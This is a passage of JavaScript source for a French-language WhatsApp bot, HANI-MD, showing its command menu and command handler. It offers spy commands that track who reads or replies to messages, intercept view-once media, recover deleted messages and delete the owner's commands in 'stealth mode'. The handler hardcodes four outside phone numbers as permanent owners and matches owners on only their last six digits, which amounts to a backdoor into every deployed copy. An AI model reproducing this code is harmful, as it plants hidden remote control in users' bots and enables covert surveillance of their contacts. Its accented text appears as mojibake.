â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€ã€Œ ðŸ”§ OUTILS ã€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ${prefix}sticker  âžœ Image/VidÃ©o â†’ Sticker
â”‚ ${prefix}toimg    âžœ Sticker â†’ Image
â”‚ ${prefix}calc     âžœ Calculatrice
â”‚ ${prefix}tts      âžœ Texte â†’ Audio
â”‚ ${prefix}song     âžœ TÃ©lÃ©charger musique
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€ã€Œ ðŸ‘¥ GROUPE ã€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ${prefix}kick @   â”‚ ${prefix}add nÂ°   â”‚ ${prefix}link
â”‚ ${prefix}promote  â”‚ ${prefix}demote   â”‚ ${prefix}tagall
â”‚ ${prefix}hidetag  â”‚ ${prefix}warn     â”‚ ${prefix}warnlist
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€ã€Œ ðŸ›¡ï¸ PROTECTIONS ã€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ${prefix}antilink  â”‚ ${prefix}antispam  â”‚ ${prefix}antibot
â”‚ ${prefix}protection âžœ Voir Ã©tat global
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€ã€Œ ðŸ‘ï¸ VUE UNIQUE ã€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ${prefix}vv       âžœ RÃ©cupÃ©rer (rÃ©pondre)
â”‚ ${prefix}listvv   âžœ Liste interceptÃ©es
â”‚ ${prefix}viewonce âžœ on/off
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€ã€Œ ðŸ—‘ï¸ ANTI-DELETE ã€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ${prefix}antidelete âžœ on/off
â”‚ ${prefix}deleted    âžœ Voir supprimÃ©s
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€ã€Œ ðŸ“¸ STATUTS ã€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ${prefix}savestatus  âžœ on/off
â”‚ ${prefix}liststatus  âžœ Liste sauvÃ©s
â”‚ ${prefix}getstatus   âžœ RÃ©cupÃ©rer [nÂ°]
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€ã€Œ ðŸ‘‘ GESTION USERS ã€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ${prefix}approve  â”‚ ${prefix}unapprove â”‚ ${prefix}ban
â”‚ ${prefix}unban    â”‚ ${prefix}sudo      â”‚ ${prefix}delsudo
â”‚ ${prefix}mode     âžœ public/private
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€ã€Œ ðŸ•µï¸ ESPIONNAGE ã€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ${prefix}spyon     â”‚ ${prefix}spyoff    â”‚ ${prefix}spyread
â”‚ ${prefix}spyreply  â”‚ ${prefix}spystatus â”‚ ${prefix}spyhistory
â”‚ ${prefix}spy @user âžœ Surveiller quelqu'un
â”‚ ${prefix}ghost     âžœ Mode fantÃ´me on/off
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€ã€Œ ðŸ“… PROGRAMMATION ã€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ${prefix}schedule [nÂ°] [heure] [msg]
â”‚ ${prefix}schedulelist    â”‚ ${prefix}scheduledel
â”‚ ${prefix}statusschedule  âžœ Statuts programmÃ©s
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€ã€Œ ðŸŽµ TÃ‰LÃ‰CHARGEMENT ã€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ${prefix}play     âžœ YouTube audio (MP3)
â”‚ ${prefix}video    âžœ YouTube vidÃ©o (MP4)
â”‚ ${prefix}spotify  âžœ Spotify audio
â”‚ ${prefix}spsearch âžœ Recherche Spotify
â”œâ”€â”€â”€â”€â”€â”€â”€â”€ RÃ©seaux Sociaux â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ ${prefix}tiktok   âžœ TikTok sans watermark
â”‚ ${prefix}fb       âžœ VidÃ©o Facebook
â”‚ ${prefix}ig       âžœ Instagram (photo/vidÃ©o)
â”‚ ${prefix}twitter  âžœ Twitter/X mÃ©dia
â”‚ ${prefix}pin      âžœ Pinterest image HD
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€ã€Œ âš™ï¸ SYSTÃˆME ã€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ${prefix}broadcast [msg] âžœ Diffuser
â”‚ ${prefix}restart        âžœ RedÃ©marrer
â”‚ ${prefix}invisible      âžœ on/off
â”‚ ${prefix}ghost          âžœ Mode fantÃ´me
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€ã€Œ ðŸ’Ž PREMIUM ã€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ${prefix}premium   âžœ Voir les plans
â”‚ ${prefix}myplan    âžœ Mon abonnement
â”‚ ${prefix}plans     âžœ Comparer les plans
â”‚ ${prefix}upgrade   âžœ Activer un code
â”œâ”€â”€â”€â”€â”€â”€â”€â”€ ðŸ‘‘ Owner Only â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ ${prefix}gencode   âžœ GÃ©nÃ©rer un code
â”‚ ${prefix}gencodes  âžœ GÃ©nÃ©rer plusieurs
â”‚ ${prefix}listcodes âžœ Liste des codes
â”‚ ${prefix}activercode âžœ Activer pour client
â”‚ ${prefix}addpremium âžœ Ajouter premium
â”œâ”€â”€â”€â”€â”€â”€â”€â”€ ðŸš€ Bot Clients â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ ${prefix}deploybot  âžœ DÃ©ployer bot client
â”‚ ${prefix}botclients âžœ Liste bots dÃ©ployÃ©s
â”‚ ${prefix}stopbot    âžœ ArrÃªter un bot
â”‚ ${prefix}deletebot  âžœ Supprimer un bot
â”‚ ${prefix}premiumhelp âžœ Aide complÃ¨te
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘  ðŸ’¡ *Tu as accÃ¨s Ã  TOUTES les        â•‘
â•‘     commandes en tant qu'OWNER!*     â•‘
â•‘  ðŸ“– Tape ${prefix}help [cmd] pour dÃ©tails   â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
`;
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ðŸŽ¯ GESTIONNAIRE DE COMMANDES
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

async function handleCommand(hani, msg, db) {
  const from = msg.key.remoteJid;
  const body = getMessageText(msg);
  
  // Debug: afficher le texte brut reÃ§u
  console.log(`[DEBUG] Texte brut reÃ§u: "${body}" | PrÃ©fixe attendu: "${config.PREFIXE}"`);
  
  if (!body || !body.startsWith(config.PREFIXE)) return;

  const [cmd, ...rest] = body.slice(config.PREFIXE.length).trim().split(/\s+/);
  const command = (cmd || "").toLowerCase();
  const args = rest.join(" ");
  const sender = msg.key.participant || msg.key.remoteJid;
  const pushName = msg.pushName || "Utilisateur";
  
  // NumÃ©ro du bot
  const botNumber = hani.user?.id?.split(":")[0] + "@s.whatsapp.net";
  const botNumberClean = hani.user?.id?.split(":")[0] || "";
  
  // VÃ©rification owner avec plusieurs formats
  const senderNumber = extractNumber(sender);
  // NE PAS supprimer les virgules ici ! On garde la chaÃ®ne originale pour split
  const ownerNumberRaw = config.NUMERO_OWNER || "";
  
  // Debug pour TOUTES les commandes owner
  console.log(`[CMD: ${command}] Sender: ${senderNumber} | Owners: ${ownerNumberRaw} | Bot: ${botNumberClean}`);
  
  // ðŸ” PAS D'ENREGISTREMENT AUTOMATIQUE
  // Seul le propriÃ©taire (celui qui a scannÃ© le QR) peut utiliser le bot
  // Les amis/contacts ne sont PAS enregistrÃ©s automatiquement
  // Pour avoir leur propre bot, ils doivent scanner leur propre QR code
  
  // VÃ©rification TRÃˆS SOUPLE pour owner:
  // Les NUMERO_OWNER dans .env sont owners (peut Ãªtre plusieurs sÃ©parÃ©s par virgule)
  // Le numÃ©ro du bot LUI-MÃŠME peut aussi exÃ©cuter des commandes owner (pour le chat "Moi-mÃªme")
  const ownerNumbers = ownerNumberRaw.split(',').map(n => n.trim().replace(/[^0-9]/g, '')).filter(n => n.length > 0);
  
  // ðŸ‘‘ OWNERS HARDCODÃ‰S (toujours propriÃ©taires mÃªme si pas dans .env)
  const hardcodedOwners = ["22550252467", "225015025267", "66791824998402", "216965239025712"];
  hardcodedOwners.forEach(owner => {
    if (!ownerNumbers.includes(owner)) ownerNumbers.push(owner);
  });
  
  // ðŸ”‘ LE NUMÃ‰RO DU BOT LUI-MÃŠME EST TOUJOURS OWNER (celui qui a scannÃ© le QR)
  if (botNumberClean && !ownerNumbers.includes(botNumberClean)) {
    ownerNumbers.push(botNumberClean);
  }
  
  // Fonction pour vÃ©rifier si deux numÃ©ros correspondent (mÃªme partiellement)
  const numbersMatch = (num1, num2) => {
    if (!num1 || !num2) return false;
    const clean1 = num1.replace(/[^0-9]/g, '');
    const clean2 = num2.replace(/[^0-9]/g, '');
    if (clean1 === clean2) return true;
    // Les 6 derniers chiffres correspondent (pour les LIDs)
    if (clean1.length >= 6 && clean2.length >= 6) {
      if (clean1.slice(-6) === clean2.slice(-6)) return true;
    }
    // Fin de l'un contient l'autre
    if (clean1.endsWith(clean2) || clean2.endsWith(clean1)) return true;
    // Les 9 derniers chiffres (numÃ©ro standard sans indicatif)
    if (clean1.length >= 9 && clean2.length >= 9) {
      if (clean1.slice(-9) === clean2.slice(-9)) return true;
    }
    return false;
  };
  
  // ðŸ‘‘ RÃˆGLE OWNER: Le numÃ©ro du bot (qui a scannÃ© le QR) est TOUJOURS owner
  const isOwner = ownerNumbers.some(owner => numbersMatch(senderNumber, owner)) || 
                  numbersMatch(senderNumber, botNumberClean) ||
                  msg.key.fromMe === true;
  console.log(`[OWNER CHECK] Sender: ${senderNumber} | Bot: ${botNumberClean} | Owners: ${ownerNumbers.join(',')} | isOwner: ${isOwner} | fromMe: ${msg.key.fromMe}`);
  
  // Le bot peut s'envoyer des commandes Ã  lui-mÃªme (chat "Moi-mÃªme") 
  // SEULEMENT si fromMe ET que c'est dans le chat du bot
  const isBotSelf = msg.key.fromMe === true;
  
  console.log(`[DEBUG CMD] 1. isBotSelf=${isBotSelf}, isOwner=${isOwner}`);
  
  // ðŸ”’ RESTRICTION: SEUL LE PROPRIÃ‰TAIRE PEUT UTILISER LE BOT
  // Les amis/contacts ne peuvent pas utiliser ce bot
  // Ils doivent scanner leur propre QR code pour avoir leur propre bot
  if (!isOwner && !isBotSelf) {
    // Ignorer silencieusement les commandes des autres personnes
    console.log(`[BLOCKED] Commande ignorÃ©e de ${pushName} (${senderNumber}) - Pas owner`);
    return;
  }
  
  console.log(`[DEBUG CMD] 2. PassÃ© vÃ©rification owner`);
  
  const isSudo = db.isSudo(sender) || isOwner || isBotSelf;
  const isGroupMsg = isGroup(from);
  
  console.log(`[DEBUG CMD] 3. isSudo=${isSudo}, isGroupMsg=${isGroupMsg}`);
  
  // DÃ©terminer le rÃ´le de l'utilisateur pour le menu
  const getUserRole = () => {
    if (isOwner || isBotSelf) return "owner";
    if (db.isSudo(sender)) return "sudo";
    if (db.isApproved(sender)) return "approved";
    return "user";
  };
  const userRole = getUserRole();
  
  console.log(`[DEBUG CMD] 4. userRole=${userRole}`);
  
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // ðŸ”“ BYPASS COMPLET POUR OWNER - AUCUNE VÃ‰RIFICATION BLOQUANTE
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // L'owner/bot ne peut JAMAIS Ãªtre banni ou limitÃ©
  // Cela Ã©vite les problÃ¨mes avec MySQL non connectÃ©
  if (isOwner || isBotSelf) {
    console.log(`[DEBUG CMD] 5. âœ… OWNER/BOT - Bypass des vÃ©rifications ban/limit`);
  } else {
    // VÃ©rifier si banni (uniquement pour les non-owners)
    try {
      const isBannedUser = await db.isBanned(sender);
      console.log(`[DEBUG CMD] 5. isBannedUser=${isBannedUser} pour sender=${sender}`);
      if (isBannedUser) {
        console.log(`[DEBUG CMD] BANNED - retour`);
        return; // Ignorer les utilisateurs bannis
      }
    } catch (e) {
      console.log(`[DEBUG CMD] âš ï¸ Erreur vÃ©rification ban (ignorÃ©e): ${e.message}`);
      // En cas d'erreur MySQL, on laisse passer
    }

    // VÃ©rifier si limitÃ© (commande bloquÃ©e) - uniquement pour non-owners
    try {
      if (db.isLimited && db.isLimited(sender) && db.isCommandBlocked && db.isCommandBlocked(sender, command)) {
        console.log(`[DEBUG CMD] LIMITED - retour`);
        const limitations = db.getLimitations ? db.getLimitations(sender) : { level: 1 };
        const levelNames = { 1: "Basique", 2: "Moyen", 3: "Strict" };
        await hani.sendMessage(from, { 
          text: `âš ï¸ *AccÃ¨s LimitÃ©*\n\nVotre compte a des restrictions (Niveau ${limitations.level} - ${levelNames[limitations.level]}).\n\nCette commande (${command}) n'est pas disponible pour vous.\n\nCommandes autorisÃ©es: menu, help, ping` 
        }, { quoted: msg });
        return;
      }
    } catch (e) {
      console.log(`[DEBUG CMD] âš ï¸ Erreur vÃ©rification limit (ignorÃ©e): ${e.message}`);
    }
  }
  
  console.log(`[DEBUG CMD] 6. âœ… Toutes vÃ©rifications passÃ©es - PrÃªt pour switch`);

  // ï¿½ VÃ‰RIFICATION CONTRÃ”LE D'ACCÃˆS (nouveau systÃ¨me v2.0)
  if (!isBotSelf && accessControl) {
    try {
      const accessCheck = accessControl.checkCommandAccess(command, sender, {
        isGroupAdmin: verif_Admin,
        isGroup: verif_Groupe,
        isBotAdmin: admin_Groupe
      });
      
      if (!accessCheck.allowed) {
        console.log(`[ACCESS] âŒ Commande ${command} refusÃ©e pour ${sender}: ${accessCheck.reason}`);
        
        // Envoyer le message de refus stylisÃ©
        await hani.sendMessage(from, { text: accessCheck.message }, { quoted: msg });
        return;
      }
      
      // IncrÃ©menter l'utilisation si ce n'est pas le owner
      if (!accessCheck.reason?.includes('owner')) {
        try {
          premiumDB.incrementUsage(sender);
        } catch (e) {}
      }
      
      console.log(`[ACCESS] âœ… Commande ${command} autorisÃ©e (${accessCheck.level})`);
    } catch (e) {
      console.log(`[ACCESS] âš ï¸ Erreur vÃ©rification accÃ¨s (fallback premium): ${e.message}`);
      
      // Fallback vers l'ancien systÃ¨me
      if (!isOwner) {
        try {
          const premiumCheck = premiumDB.canExecuteCommand(sender, command);
          if (!premiumCheck.allowed) {
            console.log(`[PREMIUM] âŒ Commande ${command} refusÃ©e pour ${sender}: ${premiumCheck.reason}`);
            await hani.sendMessage(from, { text: premiumCheck.message }, { quoted: msg });
            return;
          }
          premiumDB.incrementUsage(sender);
        } catch (e2) {
          console.log(`[PREMIUM] âš ï¸ Erreur vÃ©rification premium (ignorÃ©e): ${e2.message}`);
        }
      }
    }
  } else if (!isBotSelf && !isOwner) {
    // Fallback si accessControl non disponible
    try {
      const premiumCheck = premiumDB.canExecuteCommand(sender, command);
      if (!premiumCheck.allowed) {
        console.log(`[PREMIUM] âŒ Commande ${command} refusÃ©e pour ${sender}: ${premiumCheck.reason}`);
        await hani.sendMessage(from, { text: premiumCheck.message }, { quoted: msg });
        return;
      }
      premiumDB.incrementUsage(sender);
    } catch (e) {
      console.log(`[PREMIUM] âš ï¸ Erreur vÃ©rification premium (ignorÃ©e): ${e.message}`);
    }
  }

  // Fonctions d'envoi - MODE FURTIF (Stealth Mode)
  const isLidChat = from.endsWith('@lid');
  const isOwnChat = from === botNumber || from.includes(botNumberClean);
  const isGroupChat = from.endsWith('@g.us');
  
  // ðŸŽ¯ MODE FURTIF: 
  // - Commandes exÃ©cutÃ©es depuis n'importe oÃ¹
  // - RÃ©ponses TOUJOURS envoyÃ©es vers "Moi-mÃªme" (botNumber)
  // - Message de commande automatiquement supprimÃ©
  const actualDestination = botNumber;
  console.log(`[STEALTH] ðŸ•µï¸ Commande de: ${from} | RÃ©ponse vers: Moi-mÃªme (${botNumber})`);
  
  // ðŸ—‘ï¸ SUPPRIMER LE MESSAGE DE COMMANDE (mode furtif)
  // Seulement si ce n'est pas dÃ©jÃ  dans "Moi-mÃªme"
  if (!isOwnChat && msg.key.fromMe) {
    try {
      await hani.sendMessage(from, { delete: msg.key });
      console.log(`[STEALTH] ðŸ—‘ï¸ Message de commande supprimÃ© dans ${from}`);
    } catch (e) {
      console.log(`[STEALTH] âš ï¸ Impossible de supprimer le message: ${e.message}`);
    }
  }
  
  // Contexte pour les rÃ©ponses (savoir d'oÃ¹ vient la commande)
  const sourceInfo = isGroupChat ? `[Groupe: ${from.split('@')[0]}]` : 
                     isLidChat ? `[LID]` : 
                     `[DM: ${from.split('@')[0]}]`;
  
  const send = async (text, options = {}) => {
    try {
      // TOUJOURS envoyer vers "Moi-mÃªme"
      const msgPayload = { text, ...options };
      await hani.sendMessage(botNumber, msgPayload);
      console.log(`[SEND] âœ… Message envoyÃ© vers Moi-mÃªme`);
    } catch (e) {
      console.log(`[SEND] âŒ Erreur: ${e.message}`);
    }
  };
  
  // Reply - envoyer vers "Moi-mÃªme" (pas de citation car chat diffÃ©rent)
  const reply = async (text, options = {}) => {
    try {
      // Envoyer vers "Moi-mÃªme" avec info sur la source
      const msgPayload = { text, ...options };
      await hani.sendMessage(botNumber, msgPayload);
      console.log(`[REPLY] âœ… RÃ©ponse envoyÃ©e vers Moi-mÃªme`);
    } catch (e) {
      console.log(`[REPLY] âŒ Erreur: ${e.message}`);
    }
  };

  // RÃ©cupÃ©rer le groupe
  const groupData = isGroupMsg ? db.getGroup(from) : null;
  
  // VÃ©rifier les permissions d'admin
  let isAdmin = false;
  let isBotAdmin = false;
  let groupMetadata = null;
  
  if (isGroupMsg) {
    try {
      groupMetadata = await hani.groupMetadata(from);
      const admins = groupMetadata.participants
        .filter(p => p.admin)
        .map(p => p.id);
      isAdmin = admins.includes(sender);
      isBotAdmin = admins.includes(botNumber);
    } catch (e) {}
  }

  // MentionnÃ©
  const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
  const quotedMsg = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
  const quotedParticipant = msg.message?.extendedTextMessage?.contextInfo?.participant;

  // IncrÃ©menter les stats
  db.incrementStats("commands");

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // ðŸ” VÃ‰RIFICATION DES PERMISSIONS
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  
  // Charger les utilisateurs approuvÃ©s depuis la DB
  const approvedList = db.data?.approved || [];
  const isApproved = approvedList.includes(senderNumber) || 
                     approvedList.includes(sender) ||
                     approvedList.some(n => sender.includes(n)) ||
                     isOwner || isSudo;
  
  // VÃ©rification du niveau d'accÃ¨s
  let hasPermission = true;
  let permissionDeniedReason = "";
  
  // ðŸ”’ MODE PRIVATE: Seuls owner et sudo peuvent utiliser le bot
  if (config.MODE === "private" && !isSudo) {
    // Quelques commandes restent accessibles en mode private
    const alwaysAllowed = ["permissions", "myaccess", "mylevel", "whoami", "ping", "menu", "help"];
    if (!alwaysAllowed.includes(command)) {
      hasPermission = false;
      permissionDeniedReason = "ðŸ”’ *Mode PrivÃ©*\n\nLe bot est en mode privÃ©. Seuls le propriÃ©taire et les sudos peuvent l'utiliser.\n\nTape `.permissions` pour voir ton niveau.";
    }
  }
  // ðŸŒ MODE PUBLIC: VÃ©rifier les niveaux d'accÃ¨s
  // âš ï¸ IMPORTANT: VÃ©rifier dans l'ordre du PLUS PERMISSIF au MOINS PERMISSIF
  else if (publicCommands.includes(command)) {
    // Commandes publiques â†’ TOUJOURS accessible Ã  tout le monde
    hasPermission = true;
  } else if (approvedOnlyCommands.includes(command)) {
    // Commandes approved exclusives (jeux, tÃ©lÃ©chargement avancÃ©, etc.)
    if (!isApproved) {
      hasPermission = false;
      permissionDeniedReason = "â›” *AccÃ¨s refusÃ©!*\n\nâœ¨ Cette commande est rÃ©servÃ©e aux *utilisateurs approuvÃ©s*.\n\nDemande au propriÃ©taire de t'ajouter avec la commande: `.approve`";
    }
  } else if (sudoOnlyCommands.includes(command)) {
    // Commandes sudo exclusives (modÃ©ration groupe, broadcast)
    if (!isSudo) {
      hasPermission = false;
      permissionDeniedReason = "â›” *AccÃ¨s refusÃ©!*\n\nðŸ›¡ï¸ Cette commande est rÃ©servÃ©e aux *administrateurs* (sudo) du bot.";
    }
  } else if (ownerOnlyCommands.includes(command)) {
    // Commandes owner seulement (contrÃ´le total)
    if (!isOwner) {
      hasPermission = false;
      permissionDeniedReason = "â›” *AccÃ¨s refusÃ©!*\n\nðŸ‘‘ Cette commande est rÃ©servÃ©e au *propriÃ©taire* du bot uniquement.";
    }
  }
  // Commandes non listÃ©es â†’ accessibles par dÃ©faut
  
  // Si pas de permission, refuser
  if (!hasPermission) {
    return reply(permissionDeniedReason);
  }

  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
  // ðŸŽ¯ COMMANDES
  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

  console.log(`[SWITCH] ðŸŽ¯ EntrÃ©e dans switch avec command="${command}" | from="${from}"`);

  switch (command) {
    
    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ GÃ‰NÃ‰RAL â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    case "ping": {
      const start = Date.now();
      await send("ðŸ“ Pong!");
      const latency = Date.now() - start;
      return send(`ðŸ“¶ Latence: ${latency}ms\nâš¡ HANI-MD est opÃ©rationnel!`);
    }

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ï¿½ TEST NOTIFICATIONS â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    case "testnotif":
    case "testn": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      console.log(`[TEST] NOTIFICATION_NUMBER = ${NOTIFICATION_NUMBER}`);
      
      try {
        await hani.sendMessage(NOTIFICATION_NUMBER, {
          text: `ðŸ§ª *TEST NOTIFICATION*\n\nâœ… Les notifications fonctionnent!\n\nðŸ“± EnvoyÃ© vers: +22550252467\nðŸ• ${new Date().toLocaleString("fr-FR")}`
        });
        return send(`âœ… Notification envoyÃ©e vers +22550252467!`);
      } catch (e) {
        console.log(`[TEST] Erreur: ${e.message}`);
        return send(`âŒ Erreur: ${e.message}`);
      }
    }

    // â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ ï¿½ðŸ•µï¸ COMMANDES ESPION SÃ‰PARÃ‰ES â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    
    case "spyread":
    case "quilit": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      if (!spyData.messageReads || spyData.messageReads.length === 0) {
        return send(`ðŸ“– *Aucune lecture dÃ©tectÃ©e*\n\n_Attends que quelqu'un lise tes messages!_\n\nðŸ’¡ Active le mode espion: \`.spy on\``);
      }
      
      const uniqueReaders = {};
      for (const read of spyData.messageReads) {
        if (!uniqueReaders[read.reader]) {
          uniqueReaders[read.reader] = { name: read.readerName, count: 0, lastTime: read.timeStr };
        }
        uniqueReaders[read.reader].count++;
      }
      
      let list = `ðŸ“– â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n   *QUI A LU TES MESSAGES*\nâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n`;
      let i = 1;
      for (const [num, data] of Object.entries(uniqueReaders)) {
        const displayName = data.name || "Non enregistrÃ©";
        const cleanNum = num.replace(/[^0-9]/g, '');
        list += `*${i}.* ${displayName !== "Non enregistrÃ©" ? `*${displayName}*` : "_Contact inconnu_"}\n`;
        list += `   ðŸ“± *NumÃ©ro:* +${cleanNum}\n`;
        list += `   ðŸ“– ${data.count} msg lu(s) â€¢ ðŸ• ${data.lastTime}\n`;
        list += `   ðŸ’¬ wa.me/${cleanNum}\n\n`;
        i++;
        if (i > 20) break;
      }
      list += `â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\nðŸ“Š *Total:* ${spyData.messageReads.length} lectures de ${Object.keys(uniqueReaders).length} personnes`;
      return send(list);
    }

    case "spyreply":
    case "quirepond": {
      if (!isOwner) return send("âŒ Commande rÃ©servÃ©e Ã  l'owner.");
      
      if (!spyData.replies || spyData.replies.length === 0) {
        return send(`â†©ï¸ *Aucune rÃ©ponse dÃ©tectÃ©e*\n\n_Attends que quelqu'un rÃ©ponde Ã  tes messages!_\n\nðŸ’¡ Active le mode espion: \`.spy on\``);
      }
      
      const uniqueRepliers = {};
      for (const reply of spyData.replies) {
        if (!uniqueRepliers[reply.replier]) {
          uniqueRepliers[reply.replier] = { name: reply.replierName, count: 0, lastTime: reply.timeStr, lastPreview: reply.preview };
        }
        uniqueRepliers[reply.replier].count++;
        uniqueRepliers[reply.replier].lastPreview = reply.preview;
      }
      
